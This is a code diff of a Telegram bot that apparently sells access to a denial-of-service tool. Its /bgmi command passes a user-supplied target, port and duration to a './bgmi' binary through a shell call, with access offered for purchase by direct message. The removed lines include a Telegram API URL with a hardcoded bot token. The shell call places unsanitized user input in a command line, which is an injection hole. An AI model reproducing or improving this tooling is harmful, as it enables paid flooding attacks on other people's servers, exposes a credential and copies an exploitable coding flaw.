@@ -5,31 +5,6 @@ import subprocess
 import datetime
 import os
 import shlex
-import time
-import requests
-import signal
-import sys
-import time
-from pytz import timezone
-
-# Timezone for IST (Mumbai)
-IST = timezone('Asia/Kolkata')
-
-url = "https://api.telegram.org/bot7390264547:AAHxE2CAk-uhPlecG1ySwopVz6ZfX1Cryl0/sendMessage"
-
-retries = 3
-for attempt in range(retries):
-    try:
-        response = requests.post(url, timeout=60)
-        response.raise_for_status()  # Raise an error on bad status codes
-        break  # If successful, break out of the loop
-    except requests.exceptions.Timeout:
-        print(f"Timeout occurred, retrying {attempt + 1}/{retries}...")
-        time.sleep(2)  # Wait a bit before retrying
-    except requests.exceptions.RequestException as e:
-        print(f"Request failed: {e}")
-        break  # Break the loop if another error occurs
-
 
 from keep_alive import keep_alive
 
@@ -372,30 +347,27 @@ def handle_bgmi(message):
         if len(command) == 4:  # Updated to accept target, time, and port
             target = command[1]
             port = int(command[2])  # Convert port to integer
-            duration = int(command[3])  # Convert time to integer
-            
-            if duration > 600:
+            time = int(command[3])  # Convert time to integer
+            if time > 600:
                 response = "Error: Time interval must be less than 600."
             else:
-                # Calculate the stop time
-                current_time = datetime.datetime.now(IST)
-                stop_time = current_time + datetime.timedelta(seconds=duration)
-                stop_time_formatted = stop_time.strftime("%H:%M:%S")
-                
-                record_command_logs(user_id, "/bgmi", target, port, duration)
-                log_command(user_id, target, port, duration)
-                start_attack_reply(message, target, port, duration)
-                
-                full_command = f"./bgmi {target} {port} {duration} 100"
+                record_command_logs(user_id, "/bgmi", target, port, time)
+                log_command(user_id, target, port, time)
+                start_attack_reply(
+                    message, target, port, time
+                )  # Call start_attack_reply function
+                full_command = f"./bgmi {target} {port} {time} 100"
                 process = subprocess.run(full_command, shell=True)
-                
                 response = (
-                    f"BGMI Attack Finished. Target: {target} Port: {port} Time: {duration} seconds\n"
-                    f"Attack will stop at: {stop_time_formatted} IST"
+                    f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                 )
-                bot.reply_to(message, response)
+                bot.reply_to(
+                    message, response
+                )  # Notify the user that the attack is finished
         else:
-            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+            response = (
+                "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+            )
     else:
         response = "🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @lipstickeraservishal"
 
